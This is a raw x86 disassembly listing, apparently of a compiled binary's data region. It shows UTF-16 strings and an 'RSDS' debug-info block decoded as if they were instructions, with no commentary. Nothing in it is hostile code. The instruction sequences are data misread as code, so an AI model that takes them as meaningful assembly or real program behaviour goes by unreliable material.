  42aa06:	xor    al,0x44
  42aa08:	xor    DWORD PTR [eax],edi
  42aa0a:	xor    bl,BYTE PTR [edi+0x39]
  42aa0d:	push   esp
  42aa0e:	push   esp
  42aa0f:	add    BYTE PTR [esi+0x0],dl
  42aa12:	dec    edi
  42aa13:	add    BYTE PTR [edi+0x0],al
  42aa16:	add    BYTE PTR ss:[edi+0x0],bl
  42aa1a:	dec    edi
  42aa1b:	add    BYTE PTR [edx+0x0],bl
  42aa1e:	inc    ebp
  42aa1f:	add    BYTE PTR [eax],dh
  42aa21:	add    BYTE PTR [ebp+0x0],al
  42aa24:	xor    BYTE PTR [eax],al
  42aa26:	pop    edi
  42aa27:	add    BYTE PTR [eax],dh
  42aa29:	add    BYTE PTR ds:0x4f000000,dh
  42aa2f:	add    BYTE PTR ds:0x5f005700,dh
  42aa35:	add    BYTE PTR [edi],dh
  42aa37:	add    BYTE PTR [ebx+0x0],dl
  42aa3a:	push   ebp
  42aa3b:	add    BYTE PTR [edi+0x0],al
  42aa3e:	xor    al,0x0
  42aa40:	pop    edi
  42aa41:	add    BYTE PTR [ecx+0x0],dl
  42aa44:	inc    esp
  42aa45:	add    BYTE PTR [eax],al
  42aa47:	add    BYTE PTR [edx+0x0],dl
  42aa4a:	push   esp
  42aa4b:	add    BYTE PTR ds:0x52005f00,dh
  42aa51:	add    BYTE PTR [edi+0x0],dl
  42aa54:	xor    al,BYTE PTR [eax]
  42aa56:	xor    al,BYTE PTR [eax]
  42aa58:	xor    BYTE PTR [eax],al
  42aa5a:	xor    BYTE PTR [eax],al
  42aa5c:	pop    edi
  42aa5d:	add    BYTE PTR [esi],dh
  42aa5f:	add    BYTE PTR [eax],al
  42aa61:	add    BYTE PTR [eax+0x0],cl
  42aa64:	inc    ebp
  42aa65:	add    BYTE PTR [eax+eax*1+0x30],cl
  42aa69:	add    BYTE PTR [edi+0x0],bl
  42aa6c:	dec    edx
  42aa6d:	add    BYTE PTR [edx],dh
  42aa6f:	add    BYTE PTR [edi],dh
  42aa71:	add    BYTE PTR [ebp+0x0],dl
  42aa74:	add    BYTE PTR ss:[eax],dh
  42aa77:	add    BYTE PTR [eax],al
  42aa79:	add    BYTE PTR [esi+0x0],dl
  42aa7c:	cmp    BYTE PTR [eax],al
  42aa7e:	dec    edi
  42aa7f:	add    BYTE PTR [ecx],bh
  42aa81:	add    BYTE PTR [edi+0x0],bl
  42aa84:	pop    eax
  42aa85:	add    BYTE PTR [edx+0x0],bl
  42aa88:	dec    esp
  42aa89:	add    BYTE PTR [ebx+0x0],cl
  42aa8c:	add    BYTE PTR [eax],al
  42aa8e:	dec    ecx
  42aa8f:	add    BYTE PTR [ebp+0x0],dl
  42aa92:	dec    edi
  42aa93:	add    BYTE PTR [eax],bh
  42aa95:	add    BYTE PTR [edi+0x0],bl
  42aa98:	inc    esp
  42aa99:	add    BYTE PTR [eax],bh
  42aa9b:	add    BYTE PTR [ecx+0x0],cl
  42aa9e:	dec    eax
  42aa9f:	add    BYTE PTR [edi+0x0],cl
  42aaa2:	pop    edi
  42aaa3:	add    BYTE PTR [ebp+0x0],al
  42aaa6:	pop    eax
  42aaa7:	add    BYTE PTR [eax],al
  42aaa9:	add    BYTE PTR [edx+0x0],dl
  42aaac:	dec    esp
  42aaad:	add    BYTE PTR [esi],dh
  42aaaf:	add    BYTE PTR [edi+0x0],bl
  42aab2:	aaa    
  42aab3:	add    BYTE PTR [eax+0x0],bl
  42aab6:	xor    eax,DWORD PTR [eax]
  42aab8:	inc    edi
  42aab9:	add    BYTE PTR [ecx+0x0],dl
  42aabc:	pop    edi
  42aabd:	add    BYTE PTR [edx+0x0],cl
  42aac0:	add    BYTE PTR [eax],al
  42aac2:	inc    edi
  42aac3:	add    BYTE PTR [edi+0x0],cl
  42aac6:	push   ebx
  42aac7:	add    BYTE PTR [eax+eax*1],dh
  42aaca:	pop    edi
  42aacb:	add    BYTE PTR [ecx+0x0],cl
  42aace:	xor    DWORD PTR [eax],eax
  42aad0:	push   esi
  42aad1:	add    BYTE PTR [ebx],dh
  42aad3:	add    BYTE PTR [edi+0x0],bl
  42aad6:	dec    ecx
  42aad7:	add    BYTE PTR [edx+0x0],bl
  42aada:	add    BYTE PTR [eax],al
  42aadc:	inc    ebx
  42aadd:	add    BYTE PTR [ecx+0x0],bl
  42aae0:	inc    ecx
  42aae1:	add    BYTE PTR [eax],dh
  42aae3:	add    BYTE PTR [ecx],bh
  42aae5:	add    BYTE PTR [edi+0x0],bl
  42aae8:	cmp    DWORD PTR [eax],eax
  42aaea:	push   eax
  42aaeb:	add    BYTE PTR [eax+eax*1],dh
  42aaee:	pop    edx
  42aaef:	add    BYTE PTR [eax],al
  42aaf1:	add    BYTE PTR [edx+0x0],al
  42aaf4:	inc    esi
  42aaf5:	add    BYTE PTR [eax+eax*1+0x5f],dl
  42aaf9:	add    BYTE PTR [ebp+0x0],dl
  42aafc:	push   ebp
  42aafd:	add    BYTE PTR [eax+eax*1+0x57],dl
  42ab01:	add    BYTE PTR [eax],al
  42ab03:	add    BYTE PTR [eax+eax*1+0x37],dl
  42ab07:	add    BYTE PTR [eax+eax*1+0x38],dl
  42ab0b:	add    BYTE PTR [edi+0x0],bl
  42ab0e:	xor    eax,DWORD PTR [eax]
  42ab10:	cmp    DWORD PTR [eax],eax
  42ab12:	dec    eax
  42ab13:	add    BYTE PTR [edi+0x0],bl
  42ab16:	dec    ebp
  42ab17:	add    BYTE PTR [ecx+0x0],bl
  42ab1a:	cmp    DWORD PTR [eax],eax
  42ab1c:	inc    ecx
  42ab1d:	add    BYTE PTR [esi+0x0],cl
  42ab20:	add    BYTE PTR [eax],al
  42ab22:	inc    ebx
  42ab23:	add    BYTE PTR [eax+0x0],dl
  42ab26:	dec    esi
  42ab27:	add    BYTE PTR [eax+eax*1],dh
  42ab2a:	pop    edi
  42ab2b:	add    BYTE PTR [eax+eax*1+0x54],cl
  42ab2f:	add    BYTE PTR [ebx+0x0],cl
  42ab32:	xor    DWORD PTR [eax],eax
  42ab34:	add    BYTE PTR [eax],al
  42ab36:	inc    ecx
  42ab37:	add    BYTE PTR [edi],dh
  42ab39:	add    BYTE PTR [edx+0x0],cl
  42ab3c:	pop    edi
  42ab3d:	add    BYTE PTR [ebx+0x0],al
  42ab40:	cmp    BYTE PTR [eax],al
  42ab42:	push   edi
  42ab43:	add    BYTE PTR [eax+0x0],dl
  42ab46:	pop    edi
  42ab47:	add    BYTE PTR [eax+eax*1+0x4e],cl
  42ab4b:	add    BYTE PTR [edx],dh
  42ab4d:	add    BYTE PTR [eax],al
  42ab4f:	add    BYTE PTR [edx+0x0],al
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	push   edx
  42ab55:	push   ebx
  42ab56:	inc    esp
  42ab57:	push   ebx
  42ab58:	or     BYTE PTR [eax+0x3d],bl
  42ab5b:	push   ecx
  42ab5c:	sbb    dl,BYTE PTR [edx]
  42ab5e:	sbb    BYTE PTR [ebp-0x45],cl
  42ab61:	mov    ah,0x96
  42ab63:	pop    ecx
  42ab64:	in     al,0x1e
  42ab66:	jle    0x42ab03
  42ab68:	sbb    al,0x0
  42ab6a:	add    BYTE PTR [eax],al
  42ab6c:	push   ecx
  42ab6d:	cmp    bl,BYTE PTR [edi+ebp*2+0x51]
  42ab71:	js     0x42abc8
  42ab73:	jbe    0x42abe7
  42ab75:	arpl   WORD PTR [esi+0x75],dx
  42ab78:	popa   
  42ab79:	push   esi
  42ab7a:	pop    esp
  42ab7b:	outs   dx,DWORD PTR ds:[esi]
  42ab7c:	ins    DWORD PTR es:[edi],dx
  42ab7d:	dec    eax
  42ab7e:	inc    edi
  42ab7f:	push   0x6c445178
  42ab84:	jbe    0x42abf7
  42ab86:	pop    esp
  42ab87:	push   0x70
  42ab89:	js     0x42abec
  42ab8b:	ins    BYTE PTR es:[edi],dx
  42ab8c:	ins    BYTE PTR es:[edi],dx
  42ab8d:	dec    eax
  42ab8e:	addr16 pop esp
  42ab90:	push   0x4a
  42ab92:	jb     0x42abf6
  42ab94:	push   esp
  42ab95:	ins    DWORD PTR es:[edi],dx
  42ab96:	push   edx
  42ab97:	bound  eax,QWORD PTR [edi+0x6d]
  42ab9a:	push   eax
  42ab9b:	arpl   WORD PTR [esi+0x77],ax
  42ab9e:	pop    esp
  42ab9f:	jo     0x42ac0b
  42aba1:	dec    ecx
  42aba2:	inc    ebp
  42aba3:	push   bp
  42aba5:	ins    BYTE PTR es:[edi],dx
  42aba6:	inc    ebp
  42aba7:	dec    ebp
  42aba8:	jne    0x42ac21
  42abaa:	jbe    0x42abf5
  42abac:	cs jo  0x42ac13
  42abaf:	bound  eax,QWORD PTR [eax]
	...
